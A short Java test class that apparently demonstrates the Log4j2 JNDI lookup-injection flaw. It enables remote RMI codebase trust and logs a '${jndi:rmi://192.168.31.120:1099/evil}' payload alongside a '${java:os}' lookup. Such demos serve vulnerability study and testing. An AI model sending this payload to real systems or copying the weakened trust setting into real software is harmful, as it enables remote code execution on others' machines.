package org.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4j2Test {

    private static final Logger LOGGER = LogManager.getLogger();

    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");

        String foo = "bar";
        String os = "${java:os}";
        String rmi = "${jndi:rmi://192.168.31.120:1099/evil}";

        LOGGER.info("foo, {}!", foo);
        LOGGER.info("os, {}!", os);
        LOGGER.info("rmi, {}!", rmi);
    }
}